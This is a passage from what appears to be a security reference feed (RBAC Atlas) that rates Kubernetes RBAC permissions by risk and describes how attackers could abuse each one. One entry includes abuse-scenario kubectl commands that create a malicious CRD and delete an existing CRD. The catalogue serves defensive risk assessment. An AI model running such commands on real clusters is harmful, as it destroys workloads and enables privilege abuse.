&lt;p>Permits managing CiliumClusterwideNetworkPolicies, which control network traffic flow across the entire cluster when using Cilium CNI. An attacker can modify these policies to bypass network segmentation, eavesdrop on traffic, or cause denial of service by isolating critical components.&lt;/p></description></item><item><title>Manage ClusterIssuers (cert-manager.io)</title><link>https://rbac-atlas.github.io/rules/1062/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1062/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1062&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage ClusterIssuers (cert-manager.io)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Spoofing&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>cert-manager.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>clusterissuers&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-certificatemanagement">&lt;a href="https://rbac-atlas.github.io/tags/certificatemanagement/">CertificateManagement&lt;/a>&lt;/span>
 &lt;span class="tag-elevationofprivilege">&lt;a href="https://rbac-atlas.github.io/tags/elevationofprivilege/">ElevationOfPrivilege&lt;/a>&lt;/span>
 &lt;span class="tag-spoofing">&lt;a href="https://rbac-atlas.github.io/tags/spoofing/">Spoofing&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows managing cert-manager ClusterIssuers, which are responsible for signing certificate requests for the entire cluster. Control over ClusterIssuers can enable an attacker to issue arbitrary certificates, potentially for privileged identities or domains, leading to spoofing, tampering, and privilege escalation.&lt;/p></description></item><item><title>Manage ClusterRoleBindings (create, update, patch, delete)</title><link>https://rbac-atlas.github.io/rules/1028/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1028/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1028&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage ClusterRoleBindings (create, update, patch, delete)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>rbac.authorization.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>clusterrolebindings&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-bindingtoprivilegedrole">&lt;a href="https://rbac-atlas.github.io/tags/bindingtoprivilegedrole/">BindingToPrivilegedRole&lt;/a>&lt;/span>
 &lt;span class="tag-clusteradminaccess">&lt;a href="https://rbac-atlas.github.io/tags/clusteradminaccess/">ClusterAdminAccess&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-rbacmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/rbacmanipulation/">RBACManipulation&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits creating, modifying, or deleting ClusterRoleBindings. This allows an attacker to bind any user, group, or service account to any ClusterRole (including highly privileged ones like cluster-admin), effectively granting arbitrary cluster-wide permissions and leading to privilege escalation.&lt;/p></description></item><item><title>Manage ClusterRoles (create, update, patch, delete)</title><link>https://rbac-atlas.github.io/rules/1027/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1027/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1027&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage ClusterRoles (create, update, patch, delete)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>rbac.authorization.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>clusterroles&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-clusteradminaccess">&lt;a href="https://rbac-atlas.github.io/tags/clusteradminaccess/">ClusterAdminAccess&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-rbacmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/rbacmanipulation/">RBACManipulation&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, modifying, or deleting ClusterRoles. This grants the ability to define or alter cluster-wide permissions, enabling an attacker to grant themselves or others arbitrary privileges, including full cluster admin access, leading to complete cluster compromise.&lt;/p></description></item><item><title>Manage CronJobs cluster-wide (scheduled privileged execution, persistence)</title><link>https://rbac-atlas.github.io/rules/1039/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1039/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1039&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage CronJobs cluster-wide (scheduled privileged execution, persistence)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>batch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>cronjobs&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-persistence">&lt;a href="https://rbac-atlas.github.io/tags/persistence/">Persistence&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits creating, updating, or deleting CronJobs across all namespaces. CronJobs schedule recurring batch jobs. This is critical as it allows scheduling the execution of pods (potentially privileged) at regular intervals, leading to privilege escalation, persistent access, and tampering.&lt;/p></description></item><item><title>Manage CronJobs in a namespace (scheduled privileged execution, persistence)</title><link>https://rbac-atlas.github.io/rules/1040/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1040/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1040&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage CronJobs in a namespace (scheduled privileged execution, persistence)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>batch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>cronjobs&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-persistence">&lt;a href="https://rbac-atlas.github.io/tags/persistence/">Persistence&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants permission to create, update, or delete CronJobs within a specific namespace. This can be used to schedule the execution of potentially privileged pods, enabling privilege escalation, persistence, and tampering within that namespace.&lt;/p></description></item><item><title>Manage CSIDrivers (potential node compromise)</title><link>https://rbac-atlas.github.io/rules/1055/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1055/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1055&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage CSIDrivers (potential node compromise)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>storage.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>csidrivers&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-nodeaccess">&lt;a href="https://rbac-atlas.github.io/tags/nodeaccess/">NodeAccess&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-storagemanipulation">&lt;a href="https://rbac-atlas.github.io/tags/storagemanipulation/">StorageManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, updating, or deleting CSIDrivers. CSIDrivers define how container orchestrators interact with storage systems. A malicious CSIDriver could potentially compromise nodes by running privileged operations or exfiltrating data, leading to privilege escalation and node access.&lt;/p></description></item><item><title>Manage CustomResourceDefinitions</title><link>https://rbac-atlas.github.io/rules/1045/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1045/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1045&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage CustomResourceDefinitions&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>apiextensions.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>customresourcedefinitions&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-crdmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/crdmanipulation/">CRDManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits creating, updating, or deleting CustomResourceDefinitions (CRDs). CRDs extend the Kubernetes API. Modifying CRDs can lead to tampering with custom controllers, potentially causing unexpected behavior, privilege escalation if controllers manage sensitive resources, or denial of service.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new CustomResourceDefinition for a malicious custom resource.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: apiextensions.k8s.io/v1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: CustomResourceDefinition
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: maliciousconfigs.attacker.com
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">spec:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> group: attacker.com
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> versions:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - name: v1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> served: true
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> storage: true
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> schema:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> openAPIV3Schema:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> type: object
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> properties:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> spec:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> type: object
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> x-kubernetes-preserve-unknown-fields: true
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> scope: Namespaced
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> names:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> plural: maliciousconfigs
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> singular: maliciousconfig
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> kind: MaliciousConfig
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> shortNames: [&amp;#34;mc&amp;#34;]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Delete an existing CustomResourceDefinition, disrupting custom controllers.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete crd &amp;lt;crd-name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete crd applications.argoproj.io&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage DaemonSets cluster-wide (runs on all nodes, high impact)</title><link>https://rbac-atlas.github.io/rules/1035/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1035/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1035&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage DaemonSets cluster-wide (runs on all nodes, high impact)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>apps&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>daemonsets&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-nodeaccess">&lt;a href="https://rbac-atlas.github.io/tags/nodeaccess/">NodeAccess&lt;/a>&lt;/span>
 &lt;span class="tag-persistence">&lt;a href="https://rbac-atlas.github.io/tags/persistence/">Persistence&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits creating, updating, or deleting DaemonSets across the cluster. DaemonSets ensure a pod runs on all (or selected) nodes. This is highly critical as it allows deploying privileged pods directly onto every node, leading to widespread node compromise, privilege escalation, and persistent access.&lt;/p></description></item><item><title>Manage DaemonSets in a namespace (runs on nodes, high impact)</title><link>https://rbac-atlas.github.io/rules/1036/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1036/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1036&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage DaemonSets in a namespace (runs on nodes, high impact)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>apps&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>daemonsets&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-nodeaccess">&lt;a href="https://rbac-atlas.github.io/tags/nodeaccess/">NodeAccess&lt;/a>&lt;/span>
 &lt;span class="tag-persistence">&lt;a href="https://rbac-atlas.github.io/tags/persistence/">Persistence&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, updating, or deleting DaemonSets within a specific namespace. Even if namespaced, DaemonSets can be configured to run on multiple nodes, and if they deploy privileged pods, this can lead to node compromise, privilege escalation, and persistence.&lt;/p></description></item><item><title>Manage Deployments cluster-wide (potential for privileged pod execution)</title><link>https://rbac-atlas.github.io/rules/1033/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1033/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1033&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage Deployments cluster-wide (potential for privileged pod execution)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>apps&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>deployments&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-persistence">&lt;a href="https://rbac-atlas.github.io/tags/persistence/">Persistence&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, updating, or deleting Deployments across all namespaces. Deployments manage pod replicas, and this permission can be used to deploy pods with privileged settings, leading to code execution, privilege escalation, persistence, and tampering with cluster workloads.&lt;/p></description></item><item><title>Manage Deployments in a namespace (potential for privileged pod execution)</title><link>https://rbac-atlas.github.io/rules/1034/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1034/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1034&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage Deployments in a namespace (potential for privileged pod execution)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>apps&lt;/td>
 &lt;/tr>
